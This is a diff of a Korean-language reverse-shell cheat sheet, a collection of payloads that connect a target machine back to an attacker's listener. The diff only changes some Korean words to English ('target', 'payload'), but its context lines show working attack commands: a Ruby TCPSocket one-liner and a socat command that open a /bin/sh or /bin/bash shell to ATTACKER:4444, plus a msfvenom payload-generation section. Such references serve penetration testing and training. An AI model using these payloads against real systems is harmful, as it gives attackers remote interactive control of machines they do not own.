@@ -1,6 +1,6 @@
 # 리버스 쉘
 
-타겟에서 공격자 리스너로 연결하는 쉘 페이로드 모음.
+target에서 공격자 리스너로 연결하는 쉘 payload 모음.
 
 ---
 
@@ -78,7 +78,7 @@ ruby -rsocket -e'f=TCPSocket.open("ATTACKER",4444).to_i;exec sprintf("/bin/sh -i
 ### socat
 
 ```bash
-# 타겟
+# target
 socat TCP:ATTACKER:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
 
 # 리스너 (TTY 쉘)
@@ -158,7 +158,7 @@ stty rows 50 cols 200
 
 ---
 
-## 페이로드 생성 (msfvenom)
+## payload 생성 (msfvenom)
 
 ```bash
 # Linux
